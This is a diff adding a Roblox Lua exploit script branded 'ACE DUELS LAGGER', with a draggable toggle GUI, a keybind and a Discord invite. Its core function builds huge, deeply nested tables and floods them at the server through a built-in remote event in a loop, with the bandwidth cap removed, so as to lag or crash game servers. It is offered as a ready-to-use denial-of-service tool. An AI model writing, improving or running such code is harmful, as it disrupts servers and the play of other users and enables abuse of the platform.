@@ -1,0 +1,311 @@
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+local LAGGER_CONFIG = isMobile and {
+    TableIncrease = 290,
+    Tries = 1,
+    LoopWaitTime = 0.85
+} or {
+    TableIncrease = 265,
+    Tries = 1,
+    LoopWaitTime = 0.05
+}
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+local function resolveRemote(path)
+    if not path or path == "" then return nil end
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then
+            obj = obj[segment]
+        else
+            return nil
+        end
+    end
+    return obj
+end
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable / (val + 2)
+end
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+local laggerEnabled = false
+local laggerThread = nil
+local function startLaggerLoop()
+    while laggerEnabled do
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        task.spawn(function()
+            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+        end)
+        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+    end
+end
+local function stopLaggerLoop()
+    laggerEnabled = false
+    if laggerThread then
+        coroutine.close(laggerThread)
+        laggerThread = nil
+    end
+end
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(startLaggerLoop)
+    coroutine.resume(laggerThread)
+end
+for _, v in pairs(workspace:GetDescendants()) do
+    if v:IsA("Texture") or v:IsA("Decal") then
+        v:Destroy()
+    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
+        v.Material = Enum.Material.SmoothPlastic
+    end
+end
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CzLaggerUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = CoreGui
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 210, 0, 105)
+MainFrame.Position = UDim2.new(0, 30, 0, 137)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15) -- Dark BG
+MainFrame.ClipsDescendants = true
+MainFrame.Active = true
+MainFrame.Parent = ScreenGui
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = MainFrame
+local BgSpade = Instance.new("TextLabel")
+BgSpade.Text = "♠"
+BgSpade.Font = Enum.Font.GothamBlack
+BgSpade.TextColor3 = Color3.fromRGB(255, 255, 255)
+BgSpade.TextTransparency = 0.92
+BgSpade.TextSize = 65
+BgSpade.BackgroundTransparency = 1
+BgSpade.Position = UDim2.new(0.5, 0, 0.5, 8)
+BgSpade.AnchorPoint = Vector2.new(0.5, 0.5)
+BgSpade.Size = UDim2.new(0, 80, 0, 80)
+BgSpade.Parent = MainFrame
+local TitleRow = Instance.new("Frame")
+TitleRow.Size = UDim2.new(1, -16, 0, 32)
+TitleRow.Position = UDim2.new(0, 8, 0, 4)
+TitleRow.BackgroundTransparency = 1
+TitleRow.Parent = MainFrame
+local LockBtn = Instance.new("TextButton")
+LockBtn.Text = "🔒"
+LockBtn.Font = Enum.Font.GothamBold
+LockBtn.TextColor3 = Color3.fromRGB(255, 160, 0) -- Orange/Yellow
+LockBtn.TextSize = 16
+LockBtn.BackgroundTransparency = 1
+LockBtn.Size = UDim2.new(0, 20, 0, 20)
+LockBtn.Position = UDim2.new(0, 0, 0.5, -10)
+LockBtn.Parent = TitleRow
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Text = "ACE DUELS LAGGER"
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 14
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0, 25, 0.5, -10)
+TitleLabel.Size = UDim2.new(1, -65, 0, 20)
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TitleRow
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Text = "X"
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Size = UDim2.new(0, 16, 0, 16)
+CloseBtn.Position = UDim2.new(1, -16, 0, 0)
+CloseBtn.Parent = TitleRow
+CloseBtn.MouseButton1Click:Connect(function()
+    stopLaggerLoop()
+    ScreenGui:Destroy()
+end)
+local ControlFrame = Instance.new("Frame")
+ControlFrame.Size = UDim2.new(1, -16, 0, 38)
+ControlFrame.Position = UDim2.new(0, 8, 0, 36)
+ControlFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ControlFrame.BackgroundTransparency = 0
+ControlFrame.Parent = MainFrame
+local ControlCorner = Instance.new("UICorner")
+ControlCorner.CornerRadius = UDim.new(1, 0) -- Perfect pill
+ControlCorner.Parent = ControlFrame
+local KeybindBtn = Instance.new("TextButton")
+KeybindBtn.Text = "V"
+KeybindBtn.Font = Enum.Font.GothamBold
+KeybindBtn.TextColor3 = Color3.new(1, 1, 1)
+KeybindBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+KeybindBtn.Size = UDim2.new(0, 26, 0, 26)
+KeybindBtn.Position = UDim2.new(0, 4, 0.5, -13)
+KeybindBtn.Parent = ControlFrame
+local KCorner = Instance.new("UICorner")
+KCorner.CornerRadius = UDim.new(1, 0)
+KCorner.Parent = KeybindBtn
+local ToggleLabel = Instance.new("TextLabel")
+ToggleLabel.Text = "Main: OFF"
+ToggleLabel.Font = Enum.Font.GothamBold
+ToggleLabel.TextColor3 = Color3.new(1, 1, 1)
+ToggleLabel.TextSize = 12
+ToggleLabel.BackgroundTransparency = 1
+ToggleLabel.Position = UDim2.new(0, 38, 0.5, -9)
+ToggleLabel.Size = UDim2.new(0, 100, 0, 18)
+ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+ToggleLabel.Parent = ControlFrame
+local SwitchBg = Instance.new("Frame")
+SwitchBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+SwitchBg.Size = UDim2.new(0, 36, 0, 18)
+SwitchBg.Position = UDim2.new(1, -42, 0.5, -9)
+SwitchBg.Parent = ControlFrame
+local SWCorner = Instance.new("UICorner")
+SWCorner.CornerRadius = UDim.new(1, 0)
+SWCorner.Parent = SwitchBg
+local SwitchKnob = Instance.new("Frame")
+SwitchKnob.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+SwitchKnob.Size = UDim2.new(0, 12, 0, 12)
+SwitchKnob.Position = UDim2.new(0, 3, 0.5, -6)
+SwitchKnob.Parent = SwitchBg
+local SKCorner = Instance.new("UICorner")
+SKCorner.CornerRadius = UDim.new(1, 0)
+SKCorner.Parent = SwitchKnob
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Text = ""
+ToggleBtn.BackgroundTransparency = 1
+ToggleBtn.Size = UDim2.new(1, 0, 1, 0)
+ToggleBtn.Parent = ControlFrame
+local function setToggle(state)
+    laggerEnabled = state
+    local goal = state and UDim2.new(0, 21, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
+    local color = state and Color3.fromRGB(200, 0, 255) or Color3.fromRGB(40, 40, 40)
+    TweenService:Create(SwitchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
+    TweenService:Create(SwitchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()
+    ToggleLabel.Text = state and "Main: ON" or "Main: OFF"
+    if state then
+        startLagger()
+    else
+        stopLaggerLoop()
+    end
+end
+ToggleBtn.MouseButton1Click:Connect(function()
+    setToggle(not laggerEnabled)
+end)
+local Separator = Instance.new("Frame")
+Separator.Size = UDim2.new(1, -16, 0, 1)
+Separator.Position = UDim2.new(0, 8, 0, 78)
+Separator.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Separator.Parent = MainFrame
+local DiscordLabel = Instance.new("TextLabel")
+DiscordLabel.Text = "discord.gg/aceduels"
+DiscordLabel.Font = Enum.Font.GothamMedium
+DiscordLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+DiscordLabel.TextSize = 9
+DiscordLabel.BackgroundTransparency = 1
+DiscordLabel.Position = UDim2.new(0, 0, 0, 82)
+DiscordLabel.Size = UDim2.new(1, 0, 0, 14)
+DiscordLabel.TextXAlignment = Enum.TextXAlignment.Center
+DiscordLabel.Parent = MainFrame
+local isLocked = false
+LockBtn.MouseButton1Click:Connect(function()
+    isLocked = not isLocked
+    if isLocked then
+        LockBtn.Text = "🔓"
+        LockBtn.TextColor3 = Color3.fromRGB(200, 200, 200) -- Greyed out when active
+    else
+        LockBtn.Text = "🔒"
+        LockBtn.TextColor3 = Color3.fromRGB(255, 160, 0) -- Orange when inactive
+    end
+end)
+local boundKey = Enum.KeyCode.V
+local listeningForKey = false
+local listenTimeout = nil
+local keyDown = false
+KeybindBtn.MouseButton1Click:Connect(function()
+    if listenTimeout then task.cancel(listenTimeout) end
+    listeningForKey = true
+    KeybindBtn.Text = "..."
+    listenTimeout = task.delay(5, function()
+        if listeningForKey then
+            listeningForKey = false
+            KeybindBtn.Text = tostring(boundKey):gsub("Enum.KeyCode.", "")
+        end
+    end)
+end)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+    if listeningForKey then
+        boundKey = input.KeyCode
+        local keyName = tostring(boundKey):gsub("Enum.KeyCode.", "")
+        KeybindBtn.Text = keyName
+        listeningForKey = false
+        if listenTimeout then 
+            task.cancel(listenTimeout)
+            listenTimeout = nil
+        end
+    end
+end)
+RunService.RenderStepped:Connect(function()
+    if boundKey and UserInputService:IsKeyDown(boundKey) then
+        if not keyDown then
+            keyDown = true
+            setToggle(not laggerEnabled)
+        end
+    else
+        keyDown = false
+    end
+end)
+local dragging = false
+local dragStart = nil
+local startPos = nil
+MainFrame.InputBegan:Connect(function(input)
+    if isLocked then return end -- Block dragging if locked
+    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if isLocked then return end -- Block movement if locked
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        MainFrame.Position = newPos
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
